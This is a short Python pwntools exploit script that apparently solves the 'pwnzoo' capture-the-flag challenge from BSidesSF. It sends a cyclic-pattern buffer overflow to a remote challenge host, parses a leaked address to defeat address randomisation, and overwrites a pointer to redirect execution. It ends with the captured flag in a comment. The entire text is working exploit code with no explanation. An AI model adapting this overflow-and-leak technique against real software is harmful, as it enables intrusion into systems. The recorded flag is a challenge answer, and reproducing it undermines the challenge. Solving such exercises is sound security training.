
from pwn import *

# r = process('./pwnzoo')
r = remote('pwnzoo-7fb58ad8.challenges.bsidessf.net', 1234)

r.recvuntil(b'dog? ')
r.sendline(b'd')
r.recvuntil(b'name: ')
r.sendline(cyclic(36))
r.recvuntil(b'3. Exit\n')
r.sendline(b'1')
leak = (int.from_bytes(r.recv().split()[4][36:-1], byteorder='little') & ~0xfff) - 0x1000
r.sendline(b'2')
r.recvuntil(b'name: ')
r.sendline(cyclic(36) + p64(leak+0x123B))
r.recvuntil(b'3. Exit\n')

r.sendline(b'1')

print('\n', r.recvall().decode().strip())

# CTF{2021_is_still_a_zoo}
